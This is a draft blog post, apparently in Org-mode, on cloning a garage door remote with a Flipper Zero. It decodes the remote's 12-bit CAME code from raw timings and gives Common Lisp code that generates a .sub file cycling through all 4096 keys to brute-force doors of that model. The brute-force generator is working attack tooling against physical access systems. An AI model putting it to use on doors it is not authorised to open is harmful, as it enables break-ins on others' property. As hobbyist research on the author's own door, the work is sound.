@@ -1,0 +1,548 @@
+#+title: Generating sub-GHz brute-force files for the Flipper Zero (draft)
+#+options: num:nil ^:{}
+
+* Introduction
+:PROPERTIES:
+:CREATED:  [2024-02-17 Sat 16:10]
+:END:
+
+As [[https://en.wikipedia.org/wiki/Flipper_Zero][Wikipedia]], puts it:
+
+#+begin_quote
+The Flipper Zero is a portable [...] multi-functional device developed
+for interaction with access control systems.
+#+end_quote
+
+Here it is in all its glory:
+
+#+attr_html: :width 600 :style border:2px solid black;
+[[file:flipper/flipper.jpg]]
+
+More specifically, the Flipper is capable of transmitting and
+receiving radio signals in the 300–900 MHz range using a [[https://www.ti.com/product/CC1101][Texas
+Instruments CC1101]] transceiver.
+
+In this note, we will have fun with my garage door remote:
+
+- We will clone it using the [[https://docs.flipper.net/sub-ghz][Sub-GHz application]] and analyze the
+  corresponding =.sub= file.
+
+- We will capture a raw signal from the same remote and analyze the
+  raw =.sub= file.
+
+- We will try to build the smallest signal that can open my garage
+  door.
+
+- We will use the knowledge we gathered to write a program that can
+  generate a =.sub= file to brute-force the garage door (or probably
+  any garage door of the same model).
+
+*Please note that the key has been altered* in the text, files and
+images below (because I am a paranoid freak and I like [[https://www.gimp.org/][GIMP]]).
+
+* Cloning the remote
+:PROPERTIES:
+:CREATED:  [2024-02-17 Sat 16:05]
+:END:
+
+Cloning the remote is very easy using the Sub-GHz application from the
+Flipper. By default, the Flipper is set to read on 433.92 MHz [[https://en.wikipedia.org/wiki/Amplitude_modulation][AM]], a
+frequency and modulation used by many remotes.
+
+The screenshots below were made with the very nice [[https://github.com/flipperdevices/qFlipper][qFlipper]]
+application.
+
+1. Go to Main Menu -> Sub-GHz.
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/sub_ghz_menu.png]]
+
+2. Press "Read".
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/read_menu.png]]
+
+3. The Flipper will wait for a signal.
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/capture.png]]
+
+4. Press the button on the remote control you want to read. If
+   successful, a screen like this will be displayed:
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/captured_key1.png]]
+
+   Clicking on it will display more details:
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/captured_key2.png]]
+
+   The "Yek", as its name suggests, is simply the reversed key:
+
+   - 0x356 in binary is 0b001101010110 (on 12 bits -- important for
+     reversing it!)
+   - The reversed sequence is 0b011010101100 (thank you [[https://www.gnu.org/software/emacs/][Emacs]][fn:1])
+   - Which is indeed 0x6AC in hexadecimal.
+
+   You can play with a converter such as [[https://www.rapidtables.com/convert/number/binary-to-hex.html][this one]].
+
+* Analyzing the =.sub= file
+:PROPERTIES:
+:CREATED:  [2024-02-17 Sat 16:10]
+:END:
+
+Here is the content of the resulting =.sub= file.
+
+#+begin_example
+Filetype: Flipper SubGhz Key File
+Version: 1
+Frequency: 433920000
+Preset: FuriHalSubGhzPresetOok650Async
+Protocol: CAME
+Bit: 12
+Key: 00 00 00 00 00 00 03 56
+#+end_example
+
+A documentation about this file format is available [[https://github.com/flipperdevices/flipperzero-firmware/blob/dev/documentation/file_formats/SubGhzFileFormats.md][here]]; we will
+quote it in the sections below.
+
+As stated above, the key is displayed in hexadecimal:
+
+- Hex -> 0x356
+- Dec -> 0d854
+- Bin -> 0b001101010110
+
+Now that we know the key, it would be interesting to check what a raw
+=.sub= file looks like, and see if we can gather enough knowledge from
+it to find the key "by hand".
+
+* Capturing a raw signal from the remote
+:PROPERTIES:
+:CREATED:  [2024-02-17 Sat 16:23]
+:END:
+
+This time, we're going to replicate the process above but using the
+"Read RAW" menu.
+
+1. In the Sub-GHz application, press "Read RAW".
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/read_raw_menu.png]]
+
+2. The Flipper will be waiting for you to record.
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/capture_raw.png]]
+
+3. Press REC then Stop, and save the raw file.
+
+   #+attr_html: :style border:2px solid black;
+   [[file:flipper/capture_raw_signal_2.png]]
+
+* Analyzing the raw =.sub= file
+:PROPERTIES:
+:CREATED:  [2024-02-17 Sat 23:17]
+:END:
+
+This is where things start to be interesting. Here is an overview of a
+*rectangular* part of the generated =.sub= file -- i.e., in the
+original file, all lines continue to the right:
+
+#+begin_example
+  Filetype: Flipper SubGhz RAW File
+  Version: 1
+  Frequency: 433920000
+  Preset: FuriHalSubGhzPresetOok650Async
+  Protocol: RAW
+  RAW_Data: 167 -730 199 -66 165 -332 131 -196 429 -98 161 -98 65 -164 129 -100 3197 -100 2045 -198 391 -64 65 -330 625 -66 129 -66 493 -66 395 -132 3023 -66 195 -100 2121 -66 6821 -8334 97 -268
+  RAW_Data: 3469 -398 131 -334 99 -298 365 -66 65 -232 1759 -66 531 -132 65 -232 8289 -8206 131 -1884 65 -1060 133 -728 97 -166 99 -266 165 -198 265 -100 229 -68 1593 -134 261 -294 395 -98 14361
+  RAW_Data: 497 -98 63 -164 229 -166 523 -166 7011 -10160 229 -1512 131 -1186 131 -66 395 -626 1869 -130 293 -66 423 -66 229 -166 195 -132 721 -132 4779 -12902 99 -360 97 -166 163 -196 261 -230
+  RAW_Data: 427 -98 2085 -164 10371 -3050 197 -262 131 -132 161 -460 229 -262 1559 -166 167 -68 99 -66 165 -100 197 -330 99 -98 199 -100 65 -266 597 -134 363 -66 9559 -6360 229 -196 263 -132 231
+  RAW_Data: 303 -610 277 -310 603 -612 281 -628 303 -314 573 -12714 319 -316 613 -322 561 -644 277 -618 309 -306 599 -610 277 -299 632 -610 279 -310 601 -612 279 -628 305 -314 571 -12724 321 -33
+  RAW_Data: 311 -590 317 -290 595 -612 313 -285 606 -598 315 -312 599 -616 283 -620 313 -288 593 -12716 343 -324 569 -296 601 -612 281 -628 305 -316 573 -620 295 -319 604 -596 309 -310 597 -610
+  RAW_Data: 581 -12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571 -12722 319 -316 613 -320 563 -646 275 -618 279 -310 601 -61
+  RAW_Data: 289 -316 611 -590 309 -596 295 -338 589 -12694 351 -306 565 -340 581 -606 289 -632 283 -310 599 -620 319 -289 600 -606 319 -292 573 -618 297 -638 283 -306 599 -12708 345 -326 567 -31
+  RAW_Data: 315 -290 595 -614 315 -315 586 -600 291 -320 613 -590 309 -594 297 -338 579 -12708 359 -290 597 -290 611 -622 277 -634 257 -324 613 -592 307 -299 628 -576 319 -324 567 -612 307 -618
+  RAW_Data: 921 -164 1683 -5334 97 -3612 99 -266 165 -100 299 -66 199 -730 131 -100 495 -100 895 -98 331 -264 231 -200 663 -66 131 -232 133 -200 399 -100 265 -100 165 -100 199 -4956 99 -1490 97
+  RAW_Data: 465 -100 1029 -298 595 -68 131 -364 231 -462 99 -294 99 -166 6425 -7818 65 -726 133 -730 99 -200 131 -560 99 -132 97 -230 65 -2168 131 -132 195 -430 197 -200 67 -464 1193 -132 1659 -
+  RAW_Data: 1357 -66 1085 -200 827 -198 361 -230 6813 -9016 97 -1906 97 -3042 65 -762 65 -766 1327 -164 197 -66 359 -66 131 -100 131 -66 229 -7024 65 -6802 459 -660 97 -232 99 -134 531 -68 199 -
+  RAW_Data: 131 -168 895 -98 1563 -100 429 -298 8543 -9968 165 -298 65 -98 165 -130 167 -98 2509 -200 399 -66 929 -66 10157 -6164 65 -198 593 -68 465 -528 1317 -100 165 -66 265 -68 1027 -266 99
+  RAW_Data: 5145 -7952 65 -992 131 -822 65 -66 99 -198 99 -1726 65 -666 99 -366 65 -100 297 -100 363 -200 361 -198 1285 -66 2521 -66 165 -66 9325 -5252 133 -198 201 -600 65 -200 499 -66 1093 -13
+  RAW_Data: 165 -596 133 -1228 65 -1460 165 -168 97 -630 133 -534 99 -132 1563 -66 167 -66 535 -64 199 -166 727 -200 5575 -8548 65 -464 65 -328 63 -330 63 -3272 65 -166 197 -100 197 -66 133 -200
+#+end_example
+
+It is hard to locate a strong signal in the =.sub= file because only
+*durations* are kept. According to the docs:
+
+#+begin_quote
+  RAW_Data, contains an array of timings, specified in microseconds.
+#+end_quote
+
+But at first glance, and knowing that I'm indeed looking for a signal,
+it appears there is a large amount of 3-digit numbers in the central
+part of the file. So this part might correspond to the time during
+which the signal from the remote was received, hence the very regular
+pattern of "signals of hundreds of microseconds". The parts above and
+below would correspond to the noise we see in the last screenshot from
+the previous section.
+
+We can strenghten that first impression using a regex search in our
+text editor that highlights all 3-digits number, either positive or
+negative:
+
+#+attr_html: :style border:2px solid black; :width 600
+[[file:flipper/3-digit.png]]
+
+Yep, lots of consecutive 3-digits numbers. Moreover, it seems that the
+duration of signals in this part of the file is always around 300 or
+600 microseconds. Some values in the 12 ms range also appear
+regularly; they might mark the beginning or end of a code.
+
+Let's isolate a few groups according to that logic and put them on
+their own line:
+
+#+begin_example
+-12714 319 -316 613 -322 561 -644 277 -618 309 -306 599 -610 277 -299 632 -610 279 -310 601 -612 279 -628 305 -314 571
+-12716 343 -324 569 -296 601 -612 281 -628 305 -316 573 -620 295 -319 604 -596 309 -310 597 -610 281 -612 291 -340 573
+-12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571
+-12694 351 -306 565 -340 581 -606 289 -632 283 -310 599 -620 319 -289 600 -606 319 -292 573 -618 297 -638 283 -306 599
+-12708 359 -290 597 -290 611 -622 277 -634 257 -324 613 -592 307 -299 628 -576 319 -324 567 -612 307 -618 281 -326 595
+#+end_example
+
+Pretty regular, and there are 13 couples! It could be 1 preamble (12
+ms of silence followed by 300 µs of signal) followed the 12 bits we're
+looking for.
+
+Let's test this hypothesis. I'll use SIG in couples where the SIGNAL
+has the longer duration, and SIL in couples where the SILENCE has the
+longer duration. Then I'll give SIG and SIL either a value of 0 or 1.
+
+#+begin_example
+                    0        0        1        1        0        1        0        1        0        1        1        0
+                    1        1        0        0        1        0        1        0        1        0        0        1
+                  SIG      SIG      SIL      SIL      SIG      SIL      SIG      SIL      SIG      SIL      SIL      SIG
+  -12714 319 -316 613 -322 561 -644 277 -618 309 -306 599 -610 277 -299 632 -610 279 -310 601 -612 279 -628 305 -314 571
+  -12716 343 -324 569 -296 601 -612 281 -628 305 -316 573 -620 295 -319 604 -596 309 -310 597 -610 281 -612 291 -340 573
+  -12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571
+  -12694 351 -306 565 -340 581 -606 289 -632 283 -310 599 -620 319 -289 600 -606 319 -292 573 -618 297 -638 283 -306 599
+  -12708 359 -290 597 -290 611 -622 277 -634 257 -324 613 -592 307 -299 628 -576 319 -324 567 -612 307 -618 281 -326 595
+#+end_example
+
+Hmm, see the binary value above? 0b001101010110, or 0x356, or 0d854!
+That's our key! So here is what we learned:
+
+- A 1 is a silence of approx. 600 µs followed by a signal of
+  approx. 300 µs.
+
+- A 0 is the other way around.
+
+- There is a preamble of 13 ms at the beginning of every code -- 12,7
+  ms of silence followed by 300 µs ms of signal.
+
+These values might heavily depend on the peculiarities of my personal
+remote, but since it works, we are obviously in the protocol's margin
+of error.
+
+Now the question arises: knowing all this, what if we could simply
+generate ALL possible 12-bit combinations, write them to a =.sub=
+file, and brute-force our garage door? Well, before trying to do that,
+a few questions must be answered.
+
+* Generating the smallest working signal
+:PROPERTIES:
+:CREATED:  [2024-02-19 Mon 18:51]
+:END:
+
+In order to generate a =.sub= file for a brute-force attack, we first
+need to understand what are the minimal conditions for the garage door
+to open, using the correct key:
+
+- How many times does the key need to be sent in sequence for the door
+  to open?
+
+- Can we alter the duration of signals to shorten the overall duration
+  of an "opening" signal?
+
+** Preliminary tests
+:PROPERTIES:
+:CREATED:  [2024-02-21 Wed 22:43]
+:END:
+
+- =test1.sub= :: The original raw file, to confirm that playing the
+  original signal from the remote can open the garage door.
+
+- =test2.sub= :: Une seconde de signal. Refaire le calcul ci-dessous
+  ici pour le nombre de répétitions à insérer (40, 10 lignes de 4
+  clés).
+
+  #+begin_example
+    -12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571
+  #+end_example
+
+  We know the key is correct, but this step ensures that the key
+  selected from the original file is "clean" -- no weird duration
+  artefact(s) that would make our test file fail.
+
+** Repetitions
+:PROPERTIES:
+:CREATED:  [2024-02-19 Mon 21:12]
+:END:
+
+De moins en moins de répétitions de clé correcte dans le fichier. On
+l'entoure de 20 clés "zéro" :
+
+- 20, 20, 20
+- 20, 10, 20
+- 20,  5, 20
+- etc., bissection
+
+To find the smallest number of repetitions, I prepared a set of raw
+files:
+
+- =test1.sub= :: The original raw file, to confirm that simply
+  repeating the original signal from the remote can open the garage
+  door.
+
+- After selecting a single signal from the original file
+
+  #+begin_example
+    -12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571
+  #+end_example
+
+- A set of =.sub= files containing the correct key, repeated n times,
+  and surrounded by > 1 second of the code 0b000000000000[fn:2]. The key
+  was taken from the original =.sub= file and the "zero" signal was
+  created simply by changing the 1s to 0s in the same key. Here is the
+  signal that will be repeated:
+
+  #+begin_example
+    -12718 309 -308 615 -320 569 -612 309 -616 279 -308 603 -612 313 -305 596 -614 279 -310 601 -614 279 -628 305 -314 571
+  #+end_example
+
+  And the "zero" code:
+
+  #+begin_example
+    -12718 309 -308 615 -320 569 -309 612 -279 616 -308 603 -313 612 -305 596 -279 614 -310 601 -279 614 -305 628 -314 571
+  #+end_example
+
+  The duration of the zero signal is approx.: 13000 + 12 * 900 (a 13
+  ms preamble followed by 12 periods of 900 µs) = 23,8 ms. By rounding
+  that to 25 ms, we need to surround the repetition with at least 40
+  "zero" signals to get at least 1s of signal before and after it. I
+  will respect the line length of the original =.sub= file.
+
+Here are the results:
+
+#+attr_html: :align center
+|-------------------+-----------------|
+| File              | Door is opening |
+|-------------------+-----------------|
+| Original raw file | Yes             |
+| n = 1             | No              |
+| n = 2             | No              |
+| n = 3             | Yes             |
+|-------------------+-----------------|
+
+From these tests it seems that repeating the signal *3 times*
+consecutively is enough to open this particular garage door.
+
+** Duration of signals
+:PROPERTIES:
+:CREATED:  [2024-02-19 Mon 21:13]
+:END:
+
+TODO
+
+* Generating a brute-force =.sub= file
+:PROPERTIES:
+:CREATED:  [2024-02-18 Sun 01:00]
+:END:
+
+Here we'll be writing a script in [[https://en.wikipedia.org/wiki/Common_Lisp][Common Lisp]]. I am not a strong Lisp
+programmer, but I just [[file:../themes/lisp.org][love Lisp]] :) The script will be tailored to our
+need so I won't bother writing defensive or even clean code.
+
+Let's start from our key: 854 in decimal value. It would be nice to
+obtain a list of bits from it. We can build this list recursively by
+accumulating the remainders of a succession of divisions by 2,
+stopping when the integer part is 0. ~floor~ will work since we deal
+with positive numbers here:
+
+#+begin_src lisp :results value verbatim :exports both
+  (defun int-to-bit-list (n acc)
+    (multiple-value-bind (q r) (floor n 2)
+      (if (zerop q) (cons r acc) (int-to-bit-list q (cons r acc)))))
+
+  (int-to-bit-list 854 '())
+#+end_src
+
+#+RESULTS:
+: (1 1 0 1 0 1 0 1 1 0)
+
+It is always nicer to hide the accumulator from the user by using a
+local, recursive helper function with ~labels~:
+
+#+begin_src lisp :results value verbatim :exports both
+  (defun int-to-bit-list (n)
+    (labels ((helper (n acc)
+               (multiple-value-bind (q r) (floor n 2)
+                 (if (zerop q) (cons r acc) (helper q (cons r acc))))))
+      (helper n '())))
+
+  (int-to-bit-list 854)
+#+end_src
+
+#+RESULTS:
+: (1 1 0 1 0 1 0 1 1 0)
+
+Our result is on 10 bits. We need 12 bits, so let's "prepend" it with
+0s. Again, I'll do it recursively, stopping when the list reaches the
+desired size:
+
+#+begin_src lisp :results value verbatim :exports both
+  (defun prepend (lst &key (elt nil) (final-size 0))
+    (let ((current-size (length lst)))
+      (if (>= current-size final-size)
+          lst
+          (prepend (cons elt lst) :elt elt :final-size final-size))))
+
+  (prepend '(a b c) :elt 'x :final-size 5)
+#+end_src
+
+#+RESULTS:
+: (X X A B C)
+
+Wrapping up:
+
+#+begin_src lisp :results value verbatim :exports both
+  (prepend (int-to-bit-list 854) :elt 0 :final-size 12)
+#+end_src
+
+#+RESULTS:
+: (0 0 1 1 0 1 0 1 0 1 1 0)
+
+Now that we know how to obtain a bit list on 12 bits from a number,
+we're going to convert it into a *signal*. A signal will be a list
+made of a preamble followed by 12 couples of values depending on the
+corresponding source bits. So we'll need two functions:
+
+- ~bit-to-signal~ will convert a single bit to a signal
+- ~bit-list-to-signal~ will do it on a bit list, producing a valid
+  signal (i.e. preamble + 12 couples of durations):
+
+#+begin_src lisp
+  (defun bit-to-signal (bit)
+    (cond ((= bit 0) (list -300 600))
+          ((= bit 1) (list -600 300))
+          (t nil)))
+
+  (defun bit-list-to-signal (bit-list)
+    (let ((full-bit-list (prepend bit-list :elt 0 :final-size 12)))
+      (append '(-12700 300) (mapcan #'bit-to-signal full-bit-list))))
+#+end_src
+
+#+RESULTS:
+: BIT-LIST-TO-SIGNAL
+
+I am hardcoding the signal values for this first quick & dirty,
+exploratory version. We'll write tests later to pin the behaviour, and
+then refactor :)
+
+Let's try out our function:
+
+#+begin_src lisp :results value verbatim :exports both
+  (bit-list-to-signal '(1 0 1))
+#+end_src
+
+#+RESULTS:
+: (-12700 300 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -300 600 -600 300 -300 600 -600 300)
+
+Let's do it for a number by defining ~int-to-signal~:
+
+#+begin_src lisp :results value verbatim :exports both
+  (defun int-to-signal (n)
+    (bit-list-to-signal (int-to-bit-list n)))
+
+  (int-to-signal 854)
+#+end_src
+
+#+RESULTS:
+: (-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600)
+
+Let's compare that with a signal from our raw file above:
+
+#+begin_example
+-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600
+-12714 319 -316 613 -322 561 -644 277 -618 309 -306 599 -610 277 -299 632 -610 279 -310 601 -612 279 -628 305 -314 571
+#+end_example
+
+That looks correct!
+
+Now we'll leave the List Paradise to enter the String Hell -- but hey,
+we need a =.sub= file after all!
+
+First we need a function that transforms a signal to a string:
+
+#+begin_src lisp :results value verbatim :exports both
+  (defun signal-to-string (sig)
+    (format nil "~{~A ~}" sig))
+
+  (signal-to-string (int-to-signal 854))
+#+end_src
+
+#+RESULTS:
+: "-12700 300 -300 600 -300 600 -600 300 -600 300 -300 600 -600 300 -300 600 -600 300 -300 600 -600 300 -600 300 -300 600 "
+
+I won't detail the ~format~ recipe here, [[https://gigamonkeys.com/book/a-few-format-recipes][Peter Seibel did it better]] in
+Practical Common Lisp.
+
+We can now write the ~generate-sub-file~ function that will insert a
+header, and then for every key, insert a signal line prefixed with a
+=RAW_Data:= string.
+
+#+begin_src lisp
+  (defun generate-sub-file (filename &key ((:from start-key)) ((:to end-key)))
+    (with-open-file (f filename :direction :output :if-exists :supersede)
+      (format f "Filetype: Flipper SubGhz RAW File
+  Version: 1
+  Frequency: 433920000
+  Preset: FuriHalSubGhzPresetOok650Async
+  Protocol: RAW~%")
+      (loop for key from start-key to end-key do
+        (format f "RAW_Data: ~a~%" (signal-to-string (int-to-signal key))))))
+
+  (generate-sub-file "bruteforce.sub" :from 0 :to 4095)
+#+end_src
+
+Voilà! The full script and the resulting file are available on GitHub
+-- the link points to a specific tag that reflects the state of the
+script at the time of this writing, but it might have evolved since :)
+
+* Brute-forcing the garage door
+:PROPERTIES:
+:CREATED:  [2024-02-18 Sun 18:03]
+:END:
+
+After uploading the =.sub= file on the Flipper Zero, we're ready to
+test it on our garage door.
+
+* Footnotes
+
+[fn:1] In Emacs Lisp:
+
+#+begin_src emacs-lisp
+  (defun alc-reverse-region (beg end)
+   (interactive "r")
+   (let ((region (buffer-substring beg end)))
+     (delete-region beg end)
+     (insert (nreverse region))))
+#+end_src
+
+[fn:2] I prefer to embed the key in some kind of signal for two
+reasons:
+
+- To "simulate" the conditions of a brute-force attack
+
+- To avoid holding the Flipper's "send" button by accident, which
+  could send bursts of the same signal and distort the results.
